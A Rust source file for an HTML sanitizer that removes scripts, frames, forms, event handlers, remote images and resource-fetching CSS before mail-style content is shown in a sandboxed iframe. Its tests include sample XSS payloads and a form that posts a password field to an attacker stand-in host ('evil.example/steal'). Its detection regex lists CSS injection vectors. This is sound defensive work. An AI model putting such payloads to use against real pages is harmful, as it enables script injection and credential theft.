//! HTML sanitizer for display (`ARCHITECTURE.md` §58). The webview renders
//! the result in a sandboxed `srcdoc` iframe with scripts and same-origin
//! disabled, so this is defence in depth, not the only wall: scripts,
//! frames, forms, objects and event handlers are removed; remote images are
//! replaced by a placeholder and counted so the UI can offer "load images";
//! `cid:` references are kept for the custom protocol that serves inline
//! attachments; inline styles are kept but stripped of anything that fetches.
//!
//! Built on `ammonia` (an allowlist over html5ever) rather than a hand-rolled
//! tag stripper, because every hand-rolled stripper eventually meets an
//! attribute it did not expect.

use regex::Regex;
use std::borrow::Cow;
use std::collections::HashSet;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::{Arc, OnceLock};

/// The placeholder `src` for a blocked remote image: a transparent 1x1 GIF.
pub const BLOCKED_IMAGE_SRC: &str =
    "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Sanitized {
    pub html: String,
    pub remote_images_blocked: u32,
    pub inline_images_kept: u32,
    pub scripts_removed: u32,
    pub links: u32,
}

fn is_remote(url: &str) -> bool {
    let u = url.trim().to_ascii_lowercase();
    u.starts_with("http://")
        || u.starts_with("https://")
        || u.starts_with("//")
        || u.starts_with("ftp://")
}

/// Scrub a `style` attribute of anything that loads a resource or runs.
fn scrub_style(style: &str) -> Option<String> {
    static BAD: OnceLock<Regex> = OnceLock::new();
    let bad = BAD.get_or_init(|| Regex::new(r"(?i)(url\s*\(|expression\s*\(|@import|javascript:|behavior\s*:|-moz-binding|position\s*:\s*fixed)").expect("static regex"));
    if bad.is_match(style) {
        // Remove the offending declarations, keep the rest.
        let kept: Vec<&str> = style.split(';').filter(|d| !bad.is_match(d)).collect();
        let joined = kept.join(";").trim().to_string();
        if joined.is_empty() {
            return None;
        }
        return Some(joined);
    }
    Some(style.to_string())
}

/// Sanitize for a sandboxed `srcdoc` iframe. `allow_remote_images` keeps
/// remote `src` values (the user chose to load them).
pub fn sanitize_html_with(html: &str, allow_remote_images: bool) -> Sanitized {
    static SCRIPT: OnceLock<Regex> = OnceLock::new();
    let script_re = SCRIPT.get_or_init(|| {
        Regex::new(r"(?i)<\s*(script|iframe|object|embed|form)\b").expect("static regex")
    });
    let scripts_removed = script_re.find_iter(html).count() as u32;
    // Protocol-relative sources are dropped by the relative-URL policy before
    // the attribute filter sees them; count them so the UI's "N images
    // blocked" is honest.
    static PROTO_RELATIVE: OnceLock<Regex> = OnceLock::new();
    let proto_relative = PROTO_RELATIVE
        .get_or_init(|| Regex::new(r#"(?i)<img\b[^>]*\bsrc\s*=\s*["']?//"#).expect("static regex"))
        .find_iter(html)
        .count() as u32;

    let remote = Arc::new(AtomicU32::new(0));
    let inline = Arc::new(AtomicU32::new(0));
    let links = Arc::new(AtomicU32::new(0));
    let (remote_c, inline_c, links_c) = (remote.clone(), inline.clone(), links.clone());

    let mut schemes: HashSet<&str> = HashSet::new();
    for s in ["http", "https", "mailto", "cid", "data", "tel"] {
        schemes.insert(s);
    }

    let mut builder = ammonia::Builder::default();
    builder
        .url_schemes(schemes)
        .url_relative(ammonia::UrlRelative::Deny)
        .link_rel(Some("noopener noreferrer nofollow"))
        .add_generic_attributes([
            "style",
            "bgcolor",
            "align",
            "valign",
            "width",
            "height",
            "cellpadding",
            "cellspacing",
            "border",
            "dir",
            "lang",
        ])
        .add_tag_attributes("a", ["target"])
        .add_tags([
            "center", "font", "tbody", "thead", "tfoot", "u", "s", "strike",
        ])
        .add_tag_attributes("font", ["color", "face", "size"])
        .attribute_filter(move |element, attribute, value| -> Option<Cow<'_, str>> {
            match (element, attribute) {
                ("img", "src") => {
                    let v = value.trim();
                    let lower = v.to_ascii_lowercase();
                    if lower.starts_with("cid:") || lower.starts_with("data:image/") {
                        inline_c.fetch_add(1, Ordering::Relaxed);
                        Some(Cow::Borrowed(value))
                    } else if is_remote(v) {
                        remote_c.fetch_add(1, Ordering::Relaxed);
                        if allow_remote_images {
                            Some(Cow::Borrowed(value))
                        } else {
                            Some(Cow::Borrowed(BLOCKED_IMAGE_SRC))
                        }
                    } else {
                        None
                    }
                }
                ("a", "href") => {
                    links_c.fetch_add(1, Ordering::Relaxed);
                    Some(Cow::Borrowed(value))
                }
                ("a", "target") => Some(Cow::Borrowed("_blank")),
                (_, "style") => scrub_style(value).map(Cow::Owned),
                (_, "srcset")
                | (_, "background")
                | (_, "poster")
                | (_, "ping")
                | (_, "formaction") => None,
                _ => Some(Cow::Borrowed(value)),
            }
        });
    let cleaned = builder.clean(html).to_string();

    Sanitized {
        html: cleaned,
        remote_images_blocked: if allow_remote_images {
            0
        } else {
            remote.load(Ordering::Relaxed) + proto_relative
        },
        inline_images_kept: inline.load(Ordering::Relaxed),
        scripts_removed,
        links: links.load(Ordering::Relaxed),
    }
}

/// The default: remote content blocked.
pub fn sanitize_html(html: &str) -> Sanitized {
    sanitize_html_with(html, false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scripts_frames_forms_and_event_handlers_are_removed() {
        let html = r#"<div onclick="alert(1)"><script>alert(2)</script><iframe src="https://evil.example/"></iframe><form action="https://evil.example/steal"><input name="pw"></form><p onmouseover="x()">Hi <a href="javascript:alert(3)">click</a></p></div>"#;
        let s = sanitize_html(html);
        let lower = s.html.to_ascii_lowercase();
        assert!(!lower.contains("<script"));
        assert!(!lower.contains("<iframe"));
        assert!(!lower.contains("<form"));
        assert!(!lower.contains("<input"));
        assert!(!lower.contains("onclick"));
        assert!(!lower.contains("onmouseover"));
        assert!(!lower.contains("javascript:"));
        assert!(lower.contains("hi"));
        assert_eq!(s.scripts_removed, 3);
    }

    #[test]
    fn remote_images_are_replaced_and_counted_while_cid_images_are_kept() {
        let html = r#"<img src="https://tracker.example/pixel.gif"><img src="cid:logo@example.com" alt="logo"><img src="//cdn.example/x.png">"#;
        let s = sanitize_html(html);
        assert_eq!(s.remote_images_blocked, 2);
        assert_eq!(s.inline_images_kept, 1);
        assert!(!s.html.contains("tracker.example"));
        assert!(s.html.contains("cid:logo@example.com"));
        assert!(s.html.contains(BLOCKED_IMAGE_SRC));
        let allowed = sanitize_html_with(html, true);
        assert!(allowed.html.contains("tracker.example"));
        assert_eq!(allowed.remote_images_blocked, 0);
    }

    #[test]
    fn inline_styles_lose_their_url_and_expression_declarations() {
        let html = r#"<div style="color: red; background: url(https://evil.example/bg.png); font-weight: bold">x</div><span style="width: expression(alert(1))">y</span>"#;
        let s = sanitize_html(html);
        assert!(s.html.contains("color: red"));
        assert!(s.html.contains("font-weight: bold"));
        assert!(!s.html.contains("url("));
        assert!(!s.html.contains("expression("));
    }

    #[test]
    fn links_open_in_a_new_context_with_rel_protection() {
        let s = sanitize_html(r#"<a href="https://example.com/x">link</a>"#);
        assert!(s.html.contains("rel=\"noopener noreferrer nofollow\""));
        assert_eq!(s.links, 1);
    }
}
